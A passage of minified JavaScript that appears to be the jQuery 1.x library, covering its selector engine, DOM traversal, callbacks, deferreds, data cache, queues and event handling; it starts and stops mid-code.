                for (var r, a = [], s = 0, l = e.length, c = null != t; l > s; s++)(r = e[s]) && (!n || n(r, o, i)) && (a.push(r), c && t.push(s));
                return a
            }

            function xe(e, t, n, o, i, r) {
                return o && !o[x] && (o = xe(o)), i && !i[x] && (i = xe(i, r)), se((function (r, a, s, l) {
                    var c, u, d, p = [],
                        f = [],
                        h = a.length,
                        m = r || function (e, t, n) {
                            for (var o = 0, i = t.length; i > o; o++) re(e, t[o], n);
                            return n
                        }(t || "*", s.nodeType ? [s] : s, []),
                        g = !e || !r && t ? m : be(m, p, e, s, l),
                        v = n ? i || (r ? e : h || o) ? [] : a : g;
                    if (n && n(g, v, s, l), o)
                        for (c = be(v, f), o(c, [], s, l), u = c.length; u--;)(d = c[u]) && (v[f[u]] = !(g[f[u]] = d));
                    if (r) {
                        if (i || e) {
                            if (i) {
                                for (c = [], u = v.length; u--;)(d = v[u]) && c.push(g[u] = d);
                                i(null, v = [], c, l)
                            }
                            for (u = v.length; u--;)(d = v[u]) && (c = i ? j(r, d) : p[u]) > -1 && (r[c] = !(a[c] = d))
                        }
                    } else v = be(v === a ? v.splice(h, v.length) : v), i ? i(null, a, v, l) : M.apply(a, v)
                }))
            }

            function we(e) {
                for (var t, n, i, r = e.length, a = o.relative[e[0].type], s = a || o.relative[" "], l = a ? 1 : 0, u = ve((function (e) {
                    return e === t
                }), s, !0), d = ve((function (e) {
                    return j(t, e) > -1
                }), s, !0), p = [function (e, n, o) {
                    var i = !a && (o || n !== c) || ((t = n).nodeType ? u(e, n, o) : d(e, n, o));
                    return t = null, i
                }]; r > l; l++)
                    if (n = o.relative[e[l].type]) p = [ve(ye(p), n)];
                    else {
                        if ((n = o.filter[e[l].type].apply(null, e[l].matches))[x]) {
                            for (i = ++l; r > i && !o.relative[e[i].type]; i++);
                            return xe(l > 1 && ye(p), l > 1 && ge(e.slice(0, l - 1).concat({
                                value: " " === e[l - 2].type ? "*" : ""
                            })).replace(R, "$1"), n, i > l && we(e.slice(l, i)), r > i && we(e = e.slice(i)), r > i && ge(e))
                        }
                        p.push(n)
                    } return ye(p)
            }

            function Ce(e, t) {
                var n = t.length > 0,
                    i = e.length > 0,
                    r = function (r, a, s, l, u) {
                        var d, p, h, m = 0,
                            g = "0",
                            v = r && [],
                            y = [],
                            b = c,
                            x = r || i && o.find.TAG("*", u),
                            w = C += null == b ? 1 : Math.random() || .1,
                            T = x.length;
                        for (u && (c = a !== f && a); g !== T && null != (d = x[g]); g++) {
                            if (i && d) {
                                for (p = 0; h = e[p++];)
                                    if (h(d, a, s)) {
                                        l.push(d);
                                        break
                                    } u && (C = w)
                            }
                            n && ((d = !h && d) && m--, r && v.push(d))
                        }
                        if (m += g, n && g !== m) {
                            for (p = 0; h = t[p++];) h(v, y, a, s);
                            if (r) {
                                if (m > 0)
                                    for (; g--;) v[g] || y[g] || (y[g] = A.call(l));
                                y = be(y)
                            }
                            M.apply(l, y), u && !r && y.length > 0 && m + t.length > 1 && re.uniqueSort(l)
                        }
                        return u && (C = w, c = b), v
                    };
                return n ? se(r) : r
            }
            return me.prototype = o.filters = o.pseudos, o.setFilters = new me, a = re.tokenize = function (e, t) {
                var n, i, r, a, s, l, c, u = k[e + " "];
                if (u) return t ? 0 : u.slice(0);
                for (s = e, l = [], c = o.preFilter; s;) {
                    for (a in (!n || (i = _.exec(s))) && (i && (s = s.slice(i[0].length) || s), l.push(r = [])), n = !1, (i = U.exec(s)) && (n = i.shift(), r.push({
                        value: n,
                        type: i[0].replace(R, " ")
                    }), s = s.slice(n.length)), o.filter) !(i = G[a].exec(s)) || c[a] && !(i = c[a](i)) || (n = i.shift(), r.push({
                        value: n,
                        type: a,
                        matches: i
                    }), s = s.slice(n.length));
                    if (!n) break
                }
                return t ? s.length : s ? re.error(e) : k(e, l).slice(0)
            }, s = re.compile = function (e, t) {
                var n, o = [],
                    i = [],
                    r = S[e + " "];
                if (!r) {
                    for (t || (t = a(e)), n = t.length; n--;)(r = we(t[n]))[x] ? o.push(r) : i.push(r);
                    (r = S(e, Ce(i, o))).selector = e
                }
                return r
            }, l = re.select = function (e, t, i, r) {
                var l, c, u, d, p, f = "function" == typeof e && e,
                    h = !r && a(e = f.selector || e);
                if (i = i || [], 1 === h.length) {
                    if ((c = h[0] = h[0].slice(0)).length > 2 && "ID" === (u = c[0]).type && n.getById && 9 === t.nodeType && m && o.relative[c[1].type]) {
                        if (!(t = (o.find.ID(u.matches[0].replace(ne, oe), t) || [])[0])) return i;
                        f && (t = t.parentNode), e = e.slice(c.shift().value.length)
                    }
                    for (l = G.needsContext.test(e) ? 0 : c.length; l-- && (u = c[l], !o.relative[d = u.type]);)
                        if ((p = o.find[d]) && (r = p(u.matches[0].replace(ne, oe), ee.test(c[0].type) && he(t.parentNode) || t))) {
                            if (c.splice(l, 1), !(e = r.length && ge(c))) return M.apply(i, r), i;
                            break
                        }
                }
                return (f || s(e, h))(r, t, !m, i, ee.test(e) && he(t.parentNode) || t), i
            }, n.sortStable = x.split("").sort(L).join("") === x, n.detectDuplicates = !!d, p(), n.sortDetached = le((function (e) {
                return 1 & e.compareDocumentPosition(f.createElement("div"))
            })), le((function (e) {
                return e.innerHTML = "<a href='#'></a>", "#" === e.firstChild.getAttribute("href")
            })) || ce("type|href|height|width", (function (e, t, n) {
                return n ? void 0 : e.getAttribute(t, "type" === t.toLowerCase() ? 1 : 2)
            })), n.attributes && le((function (e) {
                return e.innerHTML = "<input/>", e.firstChild.setAttribute("value", ""), "" === e.firstChild.getAttribute("value")
            })) || ce("value", (function (e, t, n) {
                return n || "input" !== e.nodeName.toLowerCase() ? void 0 : e.defaultValue
            })), le((function (e) {
                return null == e.getAttribute("disabled")
            })) || ce(B, (function (e, t, n) {
                var o;
                return n ? void 0 : !0 === e[t] ? t.toLowerCase() : (o = e.getAttributeNode(t)) && o.specified ? o.value : null
            })), re
        }(e);
        p.find = y, p.expr = y.selectors, p.expr[":"] = p.expr.pseudos, p.unique = y.uniqueSort, p.text = y.getText, p.isXMLDoc = y.isXML, p.contains = y.contains;
        var b = p.expr.match.needsContext,
            x = /^<(\w+)\s*\/?>(?:<\/\1>|)$/,
            w = /^.[^:#\[\.,]*$/;

        function C(e, t, n) {
            if (p.isFunction(t)) return p.grep(e, (function (e, o) {
                return !!t.call(e, o, e) !== n
            }));
            if (t.nodeType) return p.grep(e, (function (e) {
                return e === t !== n
            }));
            if ("string" == typeof t) {
                if (w.test(t)) return p.filter(t, e, n);
                t = p.filter(t, e)
            }
            return p.grep(e, (function (e) {
                return p.inArray(e, t) >= 0 !== n
            }))
        }
        p.filter = function (e, t, n) {
            var o = t[0];
            return n && (e = ":not(" + e + ")"), 1 === t.length && 1 === o.nodeType ? p.find.matchesSelector(o, e) ? [o] : [] : p.find.matches(e, p.grep(t, (function (e) {
                return 1 === e.nodeType
            })))
        }, p.fn.extend({
            find: function (e) {
                var t, n = [],
                    o = this,
                    i = o.length;
                if ("string" != typeof e) return this.pushStack(p(e).filter((function () {
                    for (t = 0; i > t; t++)
                        if (p.contains(o[t], this)) return !0
                })));
                for (t = 0; i > t; t++) p.find(e, o[t], n);
                return (n = this.pushStack(i > 1 ? p.unique(n) : n)).selector = this.selector ? this.selector + " " + e : e, n
            },
            filter: function (e) {
                return this.pushStack(C(this, e || [], !1))
            },
            not: function (e) {
                return this.pushStack(C(this, e || [], !0))
            },
            is: function (e) {
                return !!C(this, "string" == typeof e && b.test(e) ? p(e) : e || [], !1).length
            }
        });
        var T, E = e.document,
            k = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/;
        (p.fn.init = function (e, t) {
            var n, o;
            if (!e) return this;
            if ("string" == typeof e) {
                if (!(n = "<" === e.charAt(0) && ">" === e.charAt(e.length - 1) && e.length >= 3 ? [null, e, null] : k.exec(e)) || !n[1] && t) return !t || t.jquery ? (t || T).find(e) : this.constructor(t).find(e);
                if (n[1]) {
                    if (t = t instanceof p ? t[0] : t, p.merge(this, p.parseHTML(n[1], t && t.nodeType ? t.ownerDocument || t : E, !0)), x.test(n[1]) && p.isPlainObject(t))
                        for (n in t) p.isFunction(this[n]) ? this[n](t[n]) : this.attr(n, t[n]);
                    return this
                }
                if ((o = E.getElementById(n[2])) && o.parentNode) {
                    if (o.id !== n[2]) return T.find(e);
                    this.length = 1, this[0] = o
                }
                return this.context = E, this.selector = e, this
            }
            return e.nodeType ? (this.context = this[0] = e, this.length = 1, this) : p.isFunction(e) ? void 0 !== T.ready ? T.ready(e) : e(p) : (void 0 !== e.selector && (this.selector = e.selector, this.context = e.context), p.makeArray(e, this))
        }).prototype = p.fn, T = p(E);
        var S = /^(?:parents|prev(?:Until|All))/,
            L = {
                children: !0,
                contents: !0,
                next: !0,
                prev: !0
            };

        function N(e, t) {
            do {
                e = e[t]
            } while (e && 1 !== e.nodeType);
            return e
        }
        p.extend({
            dir: function (e, t, n) {
                for (var o = [], i = e[t]; i && 9 !== i.nodeType && (void 0 === n || 1 !== i.nodeType || !p(i).is(n));) 1 === i.nodeType && o.push(i), i = i[t];
                return o
            },
            sibling: function (e, t) {
                for (var n = []; e; e = e.nextSibling) 1 === e.nodeType && e !== t && n.push(e);
                return n
            }
        }), p.fn.extend({
            has: function (e) {
                var t, n = p(e, this),
                    o = n.length;
                return this.filter((function () {
                    for (t = 0; o > t; t++)
                        if (p.contains(this, n[t])) return !0
                }))
            },
            closest: function (e, t) {
                for (var n, o = 0, i = this.length, r = [], a = b.test(e) || "string" != typeof e ? p(e, t || this.context) : 0; i > o; o++)
                    for (n = this[o]; n && n !== t; n = n.parentNode)
                        if (n.nodeType < 11 && (a ? a.index(n) > -1 : 1 === n.nodeType && p.find.matchesSelector(n, e))) {
                            r.push(n);
                            break
                        } return this.pushStack(r.length > 1 ? p.unique(r) : r)
            },
            index: function (e) {
                return e ? "string" == typeof e ? p.inArray(this[0], p(e)) : p.inArray(e.jquery ? e[0] : e, this) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1
            },
            add: function (e, t) {
                return this.pushStack(p.unique(p.merge(this.get(), p(e, t))))
            },
            addBack: function (e) {
                return this.add(null == e ? this.prevObject : this.prevObject.filter(e))
            }
        }), p.each({
            parent: function (e) {
                var t = e.parentNode;
                return t && 11 !== t.nodeType ? t : null
            },
            parents: function (e) {
                return p.dir(e, "parentNode")
            },
            parentsUntil: function (e, t, n) {
                return p.dir(e, "parentNode", n)
            },
            next: function (e) {
                return N(e, "nextSibling")
            },
            prev: function (e) {
                return N(e, "previousSibling")
            },
            nextAll: function (e) {
                return p.dir(e, "nextSibling")
            },
            prevAll: function (e) {
                return p.dir(e, "previousSibling")
            },
            nextUntil: function (e, t, n) {
                return p.dir(e, "nextSibling", n)
            },
            prevUntil: function (e, t, n) {
                return p.dir(e, "previousSibling", n)
            },
            siblings: function (e) {
                return p.sibling((e.parentNode || {}).firstChild, e)
            },
            children: function (e) {
                return p.sibling(e.firstChild)
            },
            contents: function (e) {
                return p.nodeName(e, "iframe") ? e.contentDocument || e.contentWindow.document : p.merge([], e.childNodes)
            }
        }, (function (e, t) {
            p.fn[e] = function (n, o) {
                var i = p.map(this, t, n);
                return "Until" !== e.slice(-5) && (o = n), o && "string" == typeof o && (i = p.filter(o, i)), this.length > 1 && (L[e] || (i = p.unique(i)), S.test(e) && (i = i.reverse())), this.pushStack(i)
            }
        }));
        var D, I = /\S+/g,
            A = {};

        function $() {
            E.addEventListener ? (E.removeEventListener("DOMContentLoaded", M, !1), e.removeEventListener("load", M, !1)) : (E.detachEvent("onreadystatechange", M), e.detachEvent("onload", M))
        }

        function M() {
            (E.addEventListener || "load" === event.type || "complete" === E.readyState) && ($(), p.ready())
        }
        p.Callbacks = function (e) {
            e = "string" == typeof e ? A[e] || function (e) {
                var t = A[e] = {};
                return p.each(e.match(I) || [], (function (e, n) {
                    t[n] = !0
                })), t
            }(e) : p.extend({}, e);
            var t, n, o, i, r, a, s = [],
                l = !e.once && [],
                c = function (d) {
                    for (n = e.memory && d, o = !0, r = a || 0, a = 0, i = s.length, t = !0; s && i > r; r++)
                        if (!1 === s[r].apply(d[0], d[1]) && e.stopOnFalse) {
                            n = !1;
                            break
                        } t = !1, s && (l ? l.length && c(l.shift()) : n ? s = [] : u.disable())
                },
                u = {
                    add: function () {
                        if (s) {
                            var o = s.length;
                            ! function t(n) {
                                p.each(n, (function (n, o) {
                                    var i = p.type(o);
                                    "function" === i ? e.unique && u.has(o) || s.push(o) : o && o.length && "string" !== i && t(o)
                                }))
                            }(arguments), t ? i = s.length : n && (a = o, c(n))
                        }
                        return this
                    },
                    remove: function () {
                        return s && p.each(arguments, (function (e, n) {
                            for (var o;
                                (o = p.inArray(n, s, o)) > -1;) s.splice(o, 1), t && (i >= o && i--, r >= o && r--)
                        })), this
                    },
                    has: function (e) {
                        return e ? p.inArray(e, s) > -1 : !(!s || !s.length)
                    },
                    empty: function () {
                        return s = [], i = 0, this
                    },
                    disable: function () {
                        return s = l = n = void 0, this
                    },
                    disabled: function () {
                        return !s
                    },
                    lock: function () {
                        return l = void 0, n || u.disable(), this
                    },
                    locked: function () {
                        return !l
                    },
                    fireWith: function (e, n) {
                        return !s || o && !l || (n = [e, (n = n || []).slice ? n.slice() : n], t ? l.push(n) : c(n)), this
                    },
                    fire: function () {
                        return u.fireWith(this, arguments), this
                    },
                    fired: function () {
                        return !!o
                    }
                };
            return u
        }, p.extend({
            Deferred: function (e) {
                var t = [
                    ["resolve", "done", p.Callbacks("once memory"), "resolved"],
                    ["reject", "fail", p.Callbacks("once memory"), "rejected"],
                    ["notify", "progress", p.Callbacks("memory")]
                ],
                    n = "pending",
                    o = {
                        state: function () {
                            return n
                        },
                        always: function () {
                            return i.done(arguments).fail(arguments), this
                        },
                        then: function () {
                            var e = arguments;
                            return p.Deferred((function (n) {
                                p.each(t, (function (t, r) {
                                    var a = p.isFunction(e[t]) && e[t];
                                    i[r[1]]((function () {
                                        var e = a && a.apply(this, arguments);
                                        e && p.isFunction(e.promise) ? e.promise().done(n.resolve).fail(n.reject).progress(n.notify) : n[r[0] + "With"](this === o ? n.promise() : this, a ? [e] : arguments)
                                    }))
                                })), e = null
                            })).promise()
                        },
                        promise: function (e) {
                            return null != e ? p.extend(e, o) : o
                        }
                    },
                    i = {};
                return o.pipe = o.then, p.each(t, (function (e, r) {
                    var a = r[2],
                        s = r[3];
                    o[r[1]] = a.add, s && a.add((function () {
                        n = s
                    }), t[1 ^ e][2].disable, t[2][2].lock), i[r[0]] = function () {
                        return i[r[0] + "With"](this === i ? o : this, arguments), this
                    }, i[r[0] + "With"] = a.fireWith
                })), o.promise(i), e && e.call(i, i), i
            },
            when: function (e) {
                var t, n, i, r = 0,
                    a = o.call(arguments),
                    s = a.length,
                    l = 1 !== s || e && p.isFunction(e.promise) ? s : 0,
                    c = 1 === l ? e : p.Deferred(),
                    u = function (e, n, i) {
                        return function (r) {
                            n[e] = this, i[e] = arguments.length > 1 ? o.call(arguments) : r, i === t ? c.notifyWith(n, i) : --l || c.resolveWith(n, i)
                        }
                    };
                if (s > 1)
                    for (t = new Array(s), n = new Array(s), i = new Array(s); s > r; r++) a[r] && p.isFunction(a[r].promise) ? a[r].promise().done(u(r, i, a)).fail(c.reject).progress(u(r, n, t)) : --l;
                return l || c.resolveWith(i, a), c.promise()
            }
        }), p.fn.ready = function (e) {
            return p.ready.promise().done(e), this
        }, p.extend({
            isReady: !1,
            readyWait: 1,
            holdReady: function (e) {
                e ? p.readyWait++ : p.ready(!0)
            },
            ready: function (e) {
                if (!0 === e ? !--p.readyWait : !p.isReady) {
                    if (!E.body) return setTimeout(p.ready);
                    p.isReady = !0, !0 !== e && --p.readyWait > 0 || (D.resolveWith(E, [p]), p.fn.triggerHandler && (p(E).triggerHandler("ready"), p(E).off("ready")))
                }
            }
        }), p.ready.promise = function (t) {
            if (!D)
                if (D = p.Deferred(), "complete" === E.readyState) setTimeout(p.ready);
                else if (E.addEventListener) E.addEventListener("DOMContentLoaded", M, !1), e.addEventListener("load", M, !1);
                else {
                    E.attachEvent("onreadystatechange", M), e.attachEvent("onload", M);
                    var n = !1;
                    try {
                        n = null == e.frameElement && E.documentElement
                    } catch (e) { }
                    n && n.doScroll && function e() {
                        if (!p.isReady) {
                            try {
                                n.doScroll("left")
                            } catch (t) {
                                return setTimeout(e, 50)
                            }
                            $(), p.ready()
                        }
                    }()
                }
            return D.promise(t)
        };
        var P, j = "undefined";
        for (P in p(u)) break;
        u.ownLast = "0" !== P, u.inlineBlockNeedsLayout = !1, p((function () {
            var e, t, n, o;
            (n = E.getElementsByTagName("body")[0]) && n.style && (t = E.createElement("div"), (o = E.createElement("div")).style.cssText = "position:absolute;border:0;width:0;height:0;top:0;left:-9999px", n.appendChild(o).appendChild(t), typeof t.style.zoom !== j && (t.style.cssText = "display:inline;margin:0;border:0;padding:1px;width:1px;zoom:1", u.inlineBlockNeedsLayout = e = 3 === t.offsetWidth, e && (n.style.zoom = 1)), n.removeChild(o))
        })),
            function () {
                var e = E.createElement("div");
                if (null == u.deleteExpando) {
                    u.deleteExpando = !0;
                    try {
                        delete e.test
                    } catch (e) {
                        u.deleteExpando = !1
                    }
                }
                e = null
            }(), p.acceptData = function (e) {
                var t = p.noData[(e.nodeName + " ").toLowerCase()],
                    n = +e.nodeType || 1;
                return (1 === n || 9 === n) && (!t || !0 !== t && e.getAttribute("classid") === t)
            };
        var B = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
            O = /([A-Z])/g;

        function H(e, t, n) {
            if (void 0 === n && 1 === e.nodeType) {
                var o = "data-" + t.replace(O, "-$1").toLowerCase();
                if ("string" == typeof (n = e.getAttribute(o))) {
                    try {
                        n = "true" === n || "false" !== n && ("null" === n ? null : +n + "" === n ? +n : B.test(n) ? p.parseJSON(n) : n)
                    } catch (e) { }
                    p.data(e, t, n)
                } else n = void 0
            }
            return n
        }

        function F(e) {
            var t;
            for (t in e)
                if (("data" !== t || !p.isEmptyObject(e[t])) && "toJSON" !== t) return !1;
            return !0
        }

        function z(e, t, o, i) {
            if (p.acceptData(e)) {
                var r, a, s = p.expando,
                    l = e.nodeType,
                    c = l ? p.cache : e,
                    u = l ? e[s] : e[s] && s;
                if (u && c[u] && (i || c[u].data) || void 0 !== o || "string" != typeof t) return u || (u = l ? e[s] = n.pop() || p.guid++ : s), c[u] || (c[u] = l ? {} : {
                    toJSON: p.noop
                }), ("object" == typeof t || "function" == typeof t) && (i ? c[u] = p.extend(c[u], t) : c[u].data = p.extend(c[u].data, t)), a = c[u], i || (a.data || (a.data = {}), a = a.data), void 0 !== o && (a[p.camelCase(t)] = o), "string" == typeof t ? null == (r = a[t]) && (r = a[p.camelCase(t)]) : r = a, r
            }
        }

        function q(e, t, n) {
            if (p.acceptData(e)) {
                var o, i, r = e.nodeType,
                    a = r ? p.cache : e,
                    s = r ? e[p.expando] : p.expando;
                if (a[s]) {
                    if (t && (o = n ? a[s] : a[s].data)) {
                        p.isArray(t) ? t = t.concat(p.map(t, p.camelCase)) : t in o ? t = [t] : t = (t = p.camelCase(t)) in o ? [t] : t.split(" "), i = t.length;
                        for (; i--;) delete o[t[i]];
                        if (n ? !F(o) : !p.isEmptyObject(o)) return
                    } (n || (delete a[s].data, F(a[s]))) && (r ? p.cleanData([e], !0) : u.deleteExpando || a != a.window ? delete a[s] : a[s] = null)
                }
            }
        }
        p.extend({
            cache: {},
            noData: {
                "applet ": !0,
                "embed ": !0,
                "object ": "clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
            },
            hasData: function (e) {
                return !!(e = e.nodeType ? p.cache[e[p.expando]] : e[p.expando]) && !F(e)
            },
            data: function (e, t, n) {
                return z(e, t, n)
            },
            removeData: function (e, t) {
                return q(e, t)
            },
            _data: function (e, t, n) {
                return z(e, t, n, !0)
            },
            _removeData: function (e, t) {
                return q(e, t, !0)
            }
        }), p.fn.extend({
            data: function (e, t) {
                var n, o, i, r = this[0],
                    a = r && r.attributes;
                if (void 0 === e) {
                    if (this.length && (i = p.data(r), 1 === r.nodeType && !p._data(r, "parsedAttrs"))) {
                        for (n = a.length; n--;) a[n] && (0 === (o = a[n].name).indexOf("data-") && H(r, o = p.camelCase(o.slice(5)), i[o]));
                        p._data(r, "parsedAttrs", !0)
                    }
                    return i
                }
                return "object" == typeof e ? this.each((function () {
                    p.data(this, e)
                })) : arguments.length > 1 ? this.each((function () {
                    p.data(this, e, t)
                })) : r ? H(r, e, p.data(r, e)) : void 0
            },
            removeData: function (e) {
                return this.each((function () {
                    p.removeData(this, e)
                }))
            }
        }), p.extend({
            queue: function (e, t, n) {
                var o;
                return e ? (t = (t || "fx") + "queue", o = p._data(e, t), n && (!o || p.isArray(n) ? o = p._data(e, t, p.makeArray(n)) : o.push(n)), o || []) : void 0
            },
            dequeue: function (e, t) {
                t = t || "fx";
                var n = p.queue(e, t),
                    o = n.length,
                    i = n.shift(),
                    r = p._queueHooks(e, t);
                "inprogress" === i && (i = n.shift(), o--), i && ("fx" === t && n.unshift("inprogress"), delete r.stop, i.call(e, (function () {
                    p.dequeue(e, t)
                }), r)), !o && r && r.empty.fire()
            },
            _queueHooks: function (e, t) {
                var n = t + "queueHooks";
                return p._data(e, n) || p._data(e, n, {
                    empty: p.Callbacks("once memory").add((function () {
                        p._removeData(e, t + "queue"), p._removeData(e, n)
                    }))
                })
            }
        }), p.fn.extend({
            queue: function (e, t) {
                var n = 2;
                return "string" != typeof e && (t = e, e = "fx", n--), arguments.length < n ? p.queue(this[0], e) : void 0 === t ? this : this.each((function () {
                    var n = p.queue(this, e, t);
                    p._queueHooks(this, e), "fx" === e && "inprogress" !== n[0] && p.dequeue(this, e)
                }))
            },
            dequeue: function (e) {
                return this.each((function () {
                    p.dequeue(this, e)
                }))
            },
            clearQueue: function (e) {
                return this.queue(e || "fx", [])
            },
            promise: function (e, t) {
                var n, o = 1,
                    i = p.Deferred(),
                    r = this,
                    a = this.length,
                    s = function () {
                        --o || i.resolveWith(r, [r])
                    };
                for ("string" != typeof e && (t = e, e = void 0), e = e || "fx"; a--;)(n = p._data(r[a], e + "queueHooks")) && n.empty && (o++, n.empty.add(s));
                return s(), i.promise(t)
            }
        });
        var W = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,
            R = ["Top", "Right", "Bottom", "Left"],
            _ = function (e, t) {
                return e = t || e, "none" === p.css(e, "display") || !p.contains(e.ownerDocument, e)
            },
            U = p.access = function (e, t, n, o, i, r, a) {
                var s = 0,
                    l = e.length,
                    c = null == n;
                if ("object" === p.type(n))
                    for (s in i = !0, n) p.access(e, t, s, n[s], !0, r, a);
                else if (void 0 !== o && (i = !0, p.isFunction(o) || (a = !0), c && (a ? (t.call(e, o), t = null) : (c = t, t = function (e, t, n) {
                    return c.call(p(e), n)
                })), t))
                    for (; l > s; s++) t(e[s], n, a ? o : o.call(e[s], s, t(e[s], n)));
                return i ? e : c ? t.call(e) : l ? t(e[0], n) : r
            },
            X = /^(?:checkbox|radio)$/i;
        ! function () {
            var e = E.createElement("input"),
                t = E.createElement("div"),
                n = E.createDocumentFragment();
            if (t.innerHTML = "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>", u.leadingWhitespace = 3 === t.firstChild.nodeType, u.tbody = !t.getElementsByTagName("tbody").length, u.htmlSerialize = !!t.getElementsByTagName("link").length, u.html5Clone = "<:nav></:nav>" !== E.createElement("nav").cloneNode(!0).outerHTML, e.type = "checkbox", e.checked = !0, n.appendChild(e), u.appendChecked = e.checked, t.innerHTML = "<textarea>x</textarea>", u.noCloneChecked = !!t.cloneNode(!0).lastChild.defaultValue, n.appendChild(t), t.innerHTML = "<input type='radio' checked='checked' name='t'/>", u.checkClone = t.cloneNode(!0).cloneNode(!0).lastChild.checked, u.noCloneEvent = !0, t.attachEvent && (t.attachEvent("onclick", (function () {
                u.noCloneEvent = !1
            })), t.cloneNode(!0).click()), null == u.deleteExpando) {
                u.deleteExpando = !0;
                try {
                    delete t.test
                } catch (e) {
                    u.deleteExpando = !1
                }
            }
        }(),
            function () {
                var t, n, o = E.createElement("div");
                for (t in {
                    submit: !0,
                    change: !0,
                    focusin: !0
                }) n = "on" + t, (u[t + "Bubbles"] = n in e) || (o.setAttribute(n, "t"), u[t + "Bubbles"] = !1 === o.attributes[n].expando);
                o = null
            }();
        var Y = /^(?:input|select|textarea)$/i,
            V = /^key/,
            G = /^(?:mouse|pointer|contextmenu)|click/,
            J = /^(?:focusinfocus|focusoutblur)$/,
            Z = /^([^.]*)(?:\.(.+)|)$/;

        function Q() {
            return !0
        }

        function K() {
            return !1
        }

        function ee() {
            try {
                return E.activeElement
            } catch (e) { }
        }

        function te(e) {
            var t = ne.split("|"),
                n = e.createDocumentFragment();
            if (n.createElement)
                for (; t.length;) n.createElement(t.pop());
            return n
        }
        p.event = {
            global: {},
            add: function (e, t, n, o, i) {
                var r, a, s, l, c, u, d, f, h, m, g, v = p._data(e);
                if (v) {
                    for (n.handler && (n = (l = n).handler, i = l.selector), n.guid || (n.guid = p.guid++), (a = v.events) || (a = v.events = {}), (u = v.handle) || ((u = v.handle = function (e) {
                        return typeof p === j || e && p.event.triggered === e.type ? void 0 : p.event.dispatch.apply(u.elem, arguments)
                    }).elem = e), s = (t = (t || "").match(I) || [""]).length; s--;) h = g = (r = Z.exec(t[s]) || [])[1], m = (r[2] || "").split(".").sort(), h && (c = p.event.special[h] || {}, h = (i ? c.delegateType : c.bindType) || h, c = p.event.special[h] || {}, d = p.extend({
                        type: h,
                        origType: g,
                        data: o,
                        handler: n,
                        guid: n.guid,
                        selector: i,
                        needsContext: i && p.expr.match.needsContext.test(i),
                        namespace: m.join(".")
                    }, l), (f = a[h]) || ((f = a[h] = []).delegateCount = 0, c.setup && !1 !== c.setup.call(e, o, m, u) || (e.addEventListener ? e.addEventListener(h, u, !1) : e.attachEvent && e.attachEvent("on" + h, u))), c.add && (c.add.call(e, d), d.handler.guid || (d.handler.guid = n.guid)), i ? f.splice(f.delegateCount++, 0, d) : f.push(d), p.event.global[h] = !0);
                    e = null
                }
            },
            remove: function (e, t, n, o, i) {
                var r, a, s, l, c, u, d, f, h, m, g, v = p.hasData(e) && p._data(e);
                if (v && (u = v.events)) {
                    for (c = (t = (t || "").match(I) || [""]).length; c--;)
                        if (h = g = (s = Z.exec(t[c]) || [])[1], m = (s[2] || "").split(".").sort(), h) {
                            for (d = p.event.special[h] || {}, f = u[h = (o ? d.delegateType : d.bindType) || h] || [], s = s[2] && new RegExp("(^|\\.)" + m.join("\\.(?:.*\\.|)") + "(\\.|$)"), l = r = f.length; r--;) a = f[r], !i && g !== a.origType || n && n.guid !== a.guid || s && !s.test(a.namespace) || o && o !== a.selector && ("**" !== o || !a.selector) || (f.splice(r, 1), a.selector && f.delegateCount--, d.remove && d.remove.call(e, a));
                            l && !f.length && (d.teardown && !1 !== d.teardown.call(e, m, v.handle) || p.removeEvent(e, h, v.handle), delete u[h])
                        } else
                            for (h in u) p.event.remove(e, h + t[c], n, o, !0);
                    p.isEmptyObject(u) && (delete v.handle, p._removeData(e, "events"))
                }
            },
            trigger: function (t, n, o, i) {
                var r, a, s, l, u, d, f, h = [o || E],
                    m = c.call(t, "type") ? t.type : t,
                    g = c.call(t, "namespace") ? t.namespace.split(".") : [];
                if (s = d = o = o || E, 3 !== o.nodeType && 8 !== o.nodeType && !J.test(m + p.event.triggered) && (m.indexOf(".") >= 0 && (g = m.split("."), m = g.shift(), g.sort()), a = m.indexOf(":") < 0 && "on" + m, (t = t[p.expando] ? t : new p.Event(m, "object" == typeof t && t)).isTrigger = i ? 2 : 3, t.namespace = g.join("."), t.namespace_re = t.namespace ? new RegExp("(^|\\.)" + g.join("\\.(?:.*\\.|)") + "(\\.|$)") : null, t.result = void 0, t.target || (t.target = o), n = null == n ? [t] : p.makeArray(n, [t]), u = p.event.special[m] || {}, i || !u.trigger || !1 !== u.trigger.apply(o, n))) {
                    if (!i && !u.noBubble && !p.isWindow(o)) {
                        for (l = u.delegateType || m, J.test(l + m) || (s = s.parentNode); s; s = s.parentNode) h.push(s), d = s;
                        d === (o.ownerDocument || E) && h.push(d.defaultView || d.parentWindow || e)
                    }
                    for (f = 0;
                        (s = h[f++]) && !t.isPropagationStopped();) t.type = f > 1 ? l : u.bindType || m, (r = (p._data(s, "events") || {})[t.type] && p._data(s, "handle")) && r.apply(s, n), (r = a && s[a]) && r.apply && p.acceptData(s) && (t.result = r.apply(s, n), !1 === t.result && t.preventDefault());
                    if (t.type = m, !i && !t.isDefaultPrevented() && (!u._default || !1 === u._default.apply(h.pop(), n)) && p.acceptData(o) && a && o[m] && !p.isWindow(o)) {
                        (d = o[a]) && (o[a] = null), p.event.triggered = m;
                        try {
                            o[m]()
                        } catch (e) { }
                        p.event.triggered = void 0, d && (o[a] = d)
                    }
                    return t.result
                }
            },
            dispatch: function (e) {
                e = p.event.fix(e);
                var t, n, i, r, a, s = [],
                    l = o.call(arguments),
                    c = (p._data(this, "events") || {})[e.type] || [],
                    u = p.event.special[e.type] || {};
                if (l[0] = e, e.delegateTarget = this, !u.preDispatch || !1 !== u.preDispatch.call(this, e)) {
                    for (s = p.event.handlers.call(this, e, c), t = 0;
                        (r = s[t++]) && !e.isPropagationStopped();)
                        for (e.currentTarget = r.elem, a = 0;
                            (i = r.handlers[a++]) && !e.isImmediatePropagationStopped();)(!e.namespace_re || e.namespace_re.test(i.namespace)) && (e.handleObj = i, e.data = i.data, void 0 !== (n = ((p.event.special[i.origType] || {}).handle || i.handler).apply(r.elem, l)) && !1 === (e.result = n) && (e.preventDefault(), e.stopPropagation()));
                    return u.postDispatch && u.postDispatch.call(this, e), e.result
                }
            },
            handlers: function (e, t) {
